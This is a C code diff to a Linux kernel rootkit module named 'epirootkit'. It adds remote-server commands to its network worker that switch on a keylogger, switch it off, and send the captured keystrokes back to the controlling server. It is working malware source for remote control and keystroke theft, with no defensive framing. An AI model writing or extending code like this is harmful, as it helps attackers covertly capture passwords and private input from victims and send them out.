@@ -169,7 +169,17 @@ int network_worker(void *data)
 				pr_err("epirootkit: network_worker: failed to send result message\n");
 			}
 			pr_info("epirootkit: network_worker: command result sent\n");
-
+		} else if (strncmp(recv_buffer, "klgon ", 5) == 0) {
+			epikeylog_init(0);
+			send_to_server("keylogger activated\n");
+			pr_info("epirootkit: network_worker: keylogger activated\n");
+		} else if (strncmp(recv_buffer, "klgoff", 6) == 0) {
+			epikeylog_exit();
+			send_to_server("keylogger deactivated\n");
+			pr_info("epirootkit: network_worker: keylogger deactivated\n");
+		} else if (strncmp(recv_buffer, "klg", 3) == 0) {
+			epikeylog_send_to_server();
+			pr_info("epirootkit: network_worker: keylogger content sent\n");
 		} else if (strncmp(recv_buffer, "killcom", 7) == 0) {
 			pr_info("network_worker: killcom received, exiting...\n");
 			break;
